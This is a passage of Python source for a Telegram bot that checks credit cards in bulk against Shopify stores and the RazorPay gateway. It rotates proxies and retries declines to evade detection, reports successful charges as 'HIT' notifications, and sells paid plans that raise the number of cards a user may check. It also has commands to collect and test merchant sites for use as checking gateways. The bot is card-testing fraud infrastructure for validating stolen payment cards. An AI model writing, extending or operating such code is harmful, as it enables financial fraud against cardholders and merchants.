async def check_rz_with_retry(card, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None):
    """Updated with smart retry for RazorPay"""
    tried_proxies = set()
    last = None
    
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}
        
        proxy_data = None
        if proxies_data:
            available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
            proxy_data = random.choice(available_px)
            if proxy_data: 
                tried_proxies.add(proxy_data.get('proxy_url'))
        
        result = await check_rz_api(card, proxy_data, user_id, http_session=http_session)
        
        resp_text = result.get("Response", "")
        is_retryable = is_card_retry_needed(resp_text) or result.get("Status") == "RetryError"
        
        if not is_retryable:
            return result
        
        last = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    
    if last:
        if is_card_retry_needed(last.get("Response", "")):
            last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}


# ====================== STATUS SYSTEM (kept same) ======================
def _get_system_uptime():
    if not PSUTIL_AVAILABLE: 
        return "N/A"
    uptime_seconds = int(time.time() - psutil.boot_time())
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"


def _get_bot_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"


def _create_progress_bar(percentage, length=10):
    filled_length = int(length * percentage / 100)
    return f"{'█' * filled_length}{'░' * (length - filled_length)} {percentage:.1f}%"


def _get_system_info():
    if not PSUTIL_AVAILABLE:
        return {"error": "psutil not installed", "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    try:
        cpu_usage = psutil.cpu_percent(interval=0)
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        network = psutil.net_io_counters()
        network_interfaces = psutil.net_if_addrs()
        active_interfaces = [i for i in network_interfaces.keys() if not i.startswith(('lo', 'docker', 'br-'))]
        return {
            "cpu_usage": cpu_usage, "cpu_count": cpu_count,
            "cpu_freq": cpu_freq.current if cpu_freq else 0,
            "total_memory": memory.total / (1024**3), "used_memory": memory.used / (1024**3),
            "available_memory": memory.available / (1024**3), "memory_percent": memory.percent,
            "total_disk": disk.total / (1024**3), "used_disk": disk.used / (1024**3),
            "free_disk": disk.free / (1024**3), "disk_percent": disk.percent,
            "hostname": socket.gethostname(), "os_name": platform.system(),
            "os_version": platform.version(), "architecture": platform.machine(),
            "bytes_sent": network.bytes_sent / (1024**2), "bytes_recv": network.bytes_recv / (1024**2),
            "active_interfaces": active_interfaces, "uptime_str": _get_system_uptime(),
            "bot_uptime_str": _get_bot_uptime(),
            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bot_restart_time": datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_critical": cpu_usage > 90, "memory_critical": memory.percent > 90,
            "disk_critical": disk.percent > 90, "error": None
        }
    except Exception as e:
        return {"error": str(e), "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}


async def _build_status_text():
    sys_info = await asyncio.get_event_loop().run_in_executor(None, _get_system_info)
    if sys_info.get("error"):
        return f"⌬ <b>𝐄𝐫𝐫𝐨𝐫</b> ↬ <code>❌ {sys_info['error']}</code>\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/Tyrant_Xd_Rebot'>𝑹@𝒗𝒆𝒏</a>"
    s = sys_info
    msg = (
        f"⌬ <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> ↬ <code>✅ Active</code>\n――――――――――――――\n"
        f"⌬ <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['bot_uptime_str']}</code>\n"
        f"⌬ <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> ↬ <code>{s['uptime_str']}</code>\n"
        f"⌬ <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> ↬ <code>{s['bot_restart_time']}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐂𝐏𝐔</b> ↬ <code>{s['cpu_usage']:.1f}% ({s['cpu_count']} cores)</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['cpu_usage'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐑𝐀𝐌</b> ↬ <code>{s['used_memory']:.2f}GB / {s['total_memory']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['memory_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐃𝐢𝐬𝐤</b> ↬ <code>{s['used_disk']:.2f}GB / {s['total_disk']:.2f}GB</code>\n"
        f"⊀ <b>Usage</b> ↬ <code>{_create_progress_bar(s['disk_percent'])}</code>\n――――――――――――――\n"
        f"⌬ <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> ↬ <code>↑ {s['bytes_sent']:.1f}MB ↓ {s['bytes_recv']:.1f}MB</code>\n"
    )
    if s["cpu_critical"] or s["memory_critical"] or s["disk_critical"]:
        msg += "\n⚠️ <b>Warning:</b> System resources critically low!"
    msg += f"\n――――――――――――――\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/Tyrant_Xd_Rebot'>𝑹@𝒗𝒆𝒏</a>"
    return msg


# ====================== CLIENT ======================
client = TelegramClient('razor_x_bot', API_ID, API_HASH)
client_instance = client


# ====================== HIT NOTIFICATIONS (kept same) ======================
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    try:
        prem = await is_premium_user(uid)
        tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status", "Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', gate_type)
        resp = res.get('Response', '')
        if gate_type == "RazorPay":
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        else:
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except:
        pass


async def pin_charged_message(event, msg):
    try:
        if event.is_group: 
            await msg.pin()
    except: 
        pass


# ====================== /start (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): 
            return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        if is_paid_plan(plan):
            plan_emoji = "🛠️"
            for pi in PLANS.values():
                if pi["tier"].lower() == plan.lower(): 
                    plan_emoji = pi["emoji"]
                    break
            sl = f"{PE} <b>{bs('STATUS')}</b> ━ {plan_emoji} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> {bs('Mass Limit')})"
            se = [CE["star"], CE["crown"]]
        else:
            sl = f"<b>{bs('STATUS')}</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code> {bs('in group')})"
            se = []
        text = f"""{PE} <b><i>{bs('Shopify')}</i></b>
|   {PE} <code>/sp</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/msp</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('RazorPay')}</i></b>
|   {PE} <code>/rz</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/mrz</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('Sites')}</i></b>
|   {PE} <code>/add</code> ━ <b>{bs('Add sites')}</b>
|   {PE} <code>/rm</code> ━ <b>{bs('Remove')}</b>
|   {PE} <code>/sites</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/site</code> ━ <b>{bs('Test all')}</b>

{PE} <b><i>{bs('Proxy')}</i></b> ({bs('Private')})
|   {PE} <code>/addpxy</code> ━ <b>{bs('Add')}</b>
|   {PE} <code>/proxy</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/chkpxy</code> ━ <b>{bs('Test')}</b>
|   {PE} <code>/rmpxy</code> ━ <b>{bs('Remove')}</b>

{PE} <b><i>{bs('Account')}</i></b>
|   {PE} <code>/info</code> ━ <b>{bs('Profile')}</b>
|   {PE} <code>/plan</code> ━ <b>{bs('Plans')}</b>
|   {PE} <code>/redeem</code> ━ <b>{bs('Redeem Code')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{sl}"""
        kb = [[pbtn(bs("Plans"), data="show_plans"), pbtn(bs("Support"), url="https://t.me/Tyrant_Xd_Rebot")],
              [pbtn(bs("Channel"), url=JOIN_CHANNEL_LINK), pbtn(bs("Group"), url=JOIN_GROUP_LINK)]]
        ei = [CE["bolt"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"], CE["brain"], CE["plus"], CE["cross"], CE["globe"], CE["link"], CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["info"], CE["info"]] + se
        await styled_reply(event, text, buttons=kb, emoji_ids=ei)
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")


# ====================== CALLBACKS (kept same) ======================
@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: 
        return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: 
            await event.delete()
        except: 
            pass
        await styled_send(event.chat_id, f"""{PE} <b>{bs('Welcome')}</b> {PE}
{PE} <code>/start</code> <b>{bs('for commands')}</b>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else:
        await event.answer(f"❌ {bs('Not joined')}!", alert=True)


@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b> ━ <b>{pi['cc_limit']}</b> CCs"
    plans_text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Tyrant_Xd_Rebot")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    cp = await get_user_plan(event.sender_id)
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b> ━ <b>{pi['cc_limit']}</b> CCs"
    plans_text += f"""\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>\n{PE} <i>{bs('Use /redeem to activate a code')}</i>"""
    await styled_reply(event, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Tyrant_Xd_Rebot")]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])


# ====================== /redeem COMMAND (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem(?:\s+(.+))?'))
async def redeem_code_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    
    uid = event.sender_id
    code = event.pattern_match.group(1)
    
    if not code:
        return await styled_reply(event, f"""⚡ <b>{bs('REDEEM CODE')}</b> ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣ ⚡ <code>/redeem SHOPIFY_TRIAL_9XK2M</code>
┗ ⚡ <i>{bs('Enter your plan code to activate')}</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ {bs('Contact admin to get a code')}""", emoji_ids=[CE["info"]])
    
    code = code.strip().upper()
    
    if not is_valid_code(code):
        return await styled_reply(event, f"""❌ <b>{bs('INVALID CODE')}</b> ❌
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣ ⚗️ {bs('The code you entered is invalid or expired.')}
┗ ⚡ <i>{bs('Check the code and try again')}</i>""", emoji_ids=[CE["cross"]])
    
    current_plan = await get_user_plan(uid)
    if is_paid_plan(current_plan):
        from database import _load_db
        db_data = _load_db()
        user_data = db_data["users"].get(str(uid), {})
        expiry = user_data.get("expiry")
        expiry_str = "Unknown"
        if expiry:
            try:
                if isinstance(expiry, str):
                    expiry_date = datetime.fromisoformat(expiry)
                else:
                    expiry_date = expiry
                expiry_str = expiry_date.strftime('%Y-%m-%d')
            except:
                pass
        return await styled_reply(event, f"""⚠️ <b>{bs('ACTIVE PLAN EXISTS')}</b> ⚠️
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣ ⚡ {bs('You already have an active plan')}
┣ ⚡ {bs('Current Plan')}: <b>{current_plan.upper()}</b>
┣ ⚡ {bs('Expires on')}: <code>{expiry_str}</code>
┗ ⚡ <i>{bs('Cannot redeem another code until plan expires')}</i>""", emoji_ids=[CE["stop"]])
    
    success, reason = await redeem_plan_code(uid, code)
    
    if not success:
        if reason == "invalid":
            return await styled_reply(event, f"❌ <b>{bs('Invalid Code')}</b>", emoji_ids=[CE["cross"]])
        elif reason == "used":
            return await styled_reply(event, f"❌ <b>{bs('CODE ALREADY USED')}</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n┗ ⚡ {bs('This code has already been redeemed by someone else')}", emoji_ids=[CE["cross"]])
        else:
            return await styled_reply(event, f"❌ <b>{bs('Error')}</b>", emoji_ids=[CE["cross"]])
    
    code_info = get_code_info(code)
    plan_key = code_info.get("plan")
    plan_info = PLANS.get(plan_key)
    
    expiry_date = (datetime.now() + timedelta(days=plan_info["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    
    await styled_reply(event, f"""🎉 <b>{bs('CODE REDEEMED SUCCESSFULLY!')}</b> 🎉
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{plan_info['emoji']} <b>{plan_info['name']}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┣ ⏱️ {bs('Duration')}: <code>{plan_info['duration_days']} days</code>
┣ 💳 {bs('CC Limit')}: <code>{plan_info['cc_limit']}</code>
┗ 📅 {bs('Expires')}: <code>{expiry_date}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⭐ {bs('Use /info to see your plan')}""", emoji_ids=[CE["gift"], CE["crown"], CE["check"]])
    
    try:
        sender = await event.get_sender()
        name = sender.first_name or "User"
    except:
        name = "User"
    
    try:
        await styled_send(LOG_CHANNEL_ID, f"""🎁 <b>{bs('Code Redeemed')}</b>
<a href='tg://user?id={uid}'>{name}</a> ━ {plan_info['emoji']}{plan_info['name']} ━ Code: <code>{code}</code>""")
    except:
        pass


# ====================== /info (kept same) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id)
    sites = await get_user_sites(event.sender_id)
    pc = await get_proxy_count(event.sender_id)
    
    plan_emoji = "🆓"
    plan_limit = 0
    for pi in PLANS.values():
        if pi["tier"].lower() == plan.lower():
            plan_emoji = pi["emoji"]
            plan_limit = pi["cc_limit"]
            break
    
    # MongoDB compatible user data fetch
    user_doc = None
    try:
        from database import get_mongo_db
        mdb = await get_mongo_db()
        if mdb:
            user_doc = await mdb.users.find_one({"_id": str(event.sender_id)})
    except:
        pass
    
    expiry = user_doc.get("expiry") if user_doc else None
    if expiry and isinstance(expiry, str):
        try:
            expiry = datetime.fromisoformat(expiry)
        except:
            expiry = None
    exp_str = expiry.strftime('%Y-%m-%d') if expiry else bs("Never")
    status = bs("Active") if is_paid_plan(plan) else bs("Free")
    
    if is_paid_plan(plan):
        limit_text = f"<code>{plan_limit}</code>"
    else:
        limit_text = f"<code>{FREE_SP_DAILY_LIMIT}/{bs('day')} ({bs('group')})</code>"
    
    used_today = get_free_sp_usage(event.sender_id)
    usage_line = ""
    if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID:
        usage_line = f"\n{PE} <b>{bs('Used Today')}:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>"
    
    await styled_reply(event, f"""{PE} <b>{bs('Profile')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('ID')}:</b> <code>{event.sender_id}</code>
{PE} <b>{bs('Status')}:</b> <code>{status}</code>
{PE} <b>{bs('Plan')}:</b> {plan_emoji} <b>{plan.upper()}</b>
{PE} <b>{bs('Expiry')}:</b> <code>{exp_str}</code>
{PE} <b>{bs('Limit')}:</b> {limit_text}{usage_line}
{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>
{PE} <b>{bs('Proxies')}:</b> <code>{pc}/{bs('100')}</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["globe"], CE["link"], CE["shield"]])


# ====================== SITE MANAGEMENT (kept same but errors updated) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    try:
        sta = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        sta = extract_urls_from_text(await f.read())
                finally:
                    try: 
                        os.remove(fp)
                    except: 
                        pass
            elif rm and rm.text: 
                sta = extract_urls_from_text(rm.text)
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if add_text:
            for s in extract_urls_from_text(add_text):
                if s not in sta: 
                    sta.append(s)
        if not sta:
            return await styled_reply(event, f"""{PE} <b>{bs('Add Site')}</b> {PE}\n{PE} <code>/add site.com</code>\n{PE} <i>{bs('Or reply .txt with')} </i><code>/add</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
        
        existing_norm = {normalize_site_url(s) for s in await get_user_sites(event.sender_id)}
        new_sites, already_exists = [], []
        for site in sta:
            n = normalize_site_url(site)
            if n in existing_norm:
                already_exists.append(n)
            elif n not in [normalize_site_url(s) for s in new_sites]:
                new_sites.append(n)
        
        if not new_sites:
            return await styled_reply(event, f"""{PE} <b>{bs('All sites already exist')}</b> {PE}\n{PE} <b>{bs('Duplicates')}:</b> <code>{len(already_exists)}</code>""", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
        
        uid = event.sender_id
        PENDING_ADD_SITES[uid] = {"sites": new_sites, "exists": already_exists, "event": event}
        
        kb = [
            [pbtn(f"{bs('0-5 USD')}", f"addprice:5:{uid}"), pbtn(f"{bs('0-10 USD')}", f"addprice:10:{uid}")],
            [pbtn(f"{bs('0-20 USD')}", f"addprice:20:{uid}"), pbtn(f"{bs('0-40 USD')}", f"addprice:40:{uid}")]
        ]
        
        await styled_reply(event, f"""{PE} <b>{bs('Select Price Range')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('New Sites')}:</b> <code>{len(new_sites)}</code>\n{PE} <b>{bs('Already Exist')}:</b> <code>{len(already_exists)}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <i>{bs('Only working sites within price range will be added')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
    
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])


@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
async def add_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.pop(uid, None)
    if not data: 
        return await event.answer(f"{bs('Expired')}!", alert=True)
    if uid in ACTIVE_ADD_PROCESSES: 
        return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_ADD_PROCESSES[uid] = True
    await event.answer(f"{bs('Testing sites')}...")
    try: 
        await event.delete()
    except: 
        pass
    asyncio.create_task(_process_add_sites(data["event"], data["sites"], data["exists"], max_price))


async def _process_add_sites(event, new_sites, already_exists, max_price):
    uid = event.sender_id
    total = len(new_sites)
    tested = working = dead = added_to_db = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]
    working_sites_data = []
    
    def is_stopped(): 
        return uid not in ACTIVE_ADD_PROCESSES
    
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: 
            return
        last_ui[0] = now
        try: 
            await styled_edit(sm, f"{PE} <b>{bs('Testing')}...</b> {tested}/{total} | ✅{working} ❌{dead}", emoji_ids=[CE["fire"]])
        except: 
            pass
    
    async def test_worker(site):
        nonlocal tested, working, dead, added_to_db
        async with user_site_sem:
            if is_stopped(): 
                return
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    working += 1
                    price_val = 0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: 
                            price_val = float(str(ps).replace('$', '').strip())
                        except: 
                            pass
                    working_sites_data.append({'site': site, 'gateway': res.get('gateway', 'Unknown'), 'price': ps, 'price_val': price_val})
                    if price_val <= max_price:
                        if await add_site_db(uid, site, res.get('gateway', 'Unknown'), ps): 
                            added_to_db += 1
                else: 
                    dead += 1
                await update_ui()
            except asyncio.CancelledError: 
                raise
            except: 
                dead += 1
                tested += 1
    
    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
        if is_stopped(): 
            break
        await asyncio.gather(*[asyncio.create_task(test_worker(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    
    try: 
        await styled_edit(sm, f"""{PE} <b>{bs('Complete')}</b> {PE}\n{PE} <b>{bs('Working')}:</b> <code>{working}</code> | <b>{bs('Dead')}:</b> <code>{dead}</code> | <b>{bs('Added')} ($0-${max_price}):</b> <code>{added_to_db}</code>""", emoji_ids=[CE["fire"], CE["check"], CE["cross"], CE["chart"]])
    except: 
        pass
    
    ACTIVE_ADD_PROCESSES.pop(uid, None)
    await cleanup_user_http_session(uid, "site")
    cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if rt.lower() == 'all':
        existing = await get_user_sites(event.sender_id)
        if not existing: 
            return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
        c = 0
        for s in existing:
            if await remove_site_db(event.sender_id, s): 
                c += 1
        return await styled_reply(event, f"{PE} <b>{bs('Removed')} {c} {bs('sites')}</b>", emoji_ids=[CE["check"]])
    if not rt: 
        return await styled_reply(event, f"{PE} <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
    to_rm = extract_urls_from_text(rt)
    if not to_rm: 
        return await styled_reply(event, f"{PE} <b>{bs('No URLs')}</b>", emoji_ids=[CE["cross"]])
    existing = await get_user_sites(event.sender_id)
    removed = []
    for s in to_rm:
        n = normalize_site_url(s)
        for ex in existing:
            if normalize_site_url(ex) == n:
                if await remove_site_db(event.sender_id, ex): 
                    removed.append(ex)
                break
    await styled_reply(event, f"{PE} <b>{bs('Removed')}:</b> <code>{len(removed)}</code>", emoji_ids=[CE["check"]])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if await is_banned_user(event.sender_id): 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    
    sites_data = await get_user_sites_with_info(event.sender_id)
    
    if not sites_data: 
        return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
    
    text = f"{PE} <b>{bs('Sites')}</b> ({len(sites_data)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    
    for i, s in enumerate(sites_data[:30], 1): 
        text += f"{PE} <code>{i}.</code> <b>{s['site']}</b>\n"
        text += f"    └ <b>Gateway:</b> <code>{s['gateway']}</code> | <b>Price:</b> <code>{s['price']}</code>\n"
        eid.extend([CE["link"], CE["chart"]])
    
    if len(sites_data) > 30: 
        text += f"\n<i>+{len(sites_data)-30} more</i>"
    
    await styled_reply(event, text, emoji_ids=eid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def check_sites_cmd(event):
    if await check_maintenance(event): 
        return
    if not await force_join_check(event): 
        return
    if await is_banned_user(event.sender_id): 
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): 
        return await send_premium_only_message(event)
    sites = await get_user_sites(event.sender_id)
    if not sites: 
        return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    uid = event.sender_id
    PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event}
    kb = [
        [pbtn(f"{bs('0-5 USD')}", f"siteprice:5:{uid}"), pbtn(f"{bs('0-10 USD')}", f"siteprice:10:{uid}")],
        [pbtn(f"{bs('0-20 USD')}", f"siteprice:20:{uid}"), pbtn(f"{bs('0-40 USD')}", f"siteprice:40:{uid}")]
    ]
    await styled_reply(event, f"{PE} <b>{bs('Select Price Range')}</b> {PE}\n{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>\n{PE} <i>{bs('Dead + over-price will be removed')}</i>", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"]])


@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
async def site_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_SITE_CHECK.pop(uid, None)
    if not data: 
        return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Checking')}...")
    try: 
        await event.delete()
    except: 
        pass
    asyncio.create_task(_process_site_check(data["event"], data["sites"], max_price))


async def _process_site_check(event, sites, max_price):
    uid = event.sender_id
    total = len(sites)
    tested = alive_count = dead_count = kept_count = removed_price = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Checking')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]
    dead_sites = set()
    price_removed_sites = set()
    
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: 
            return
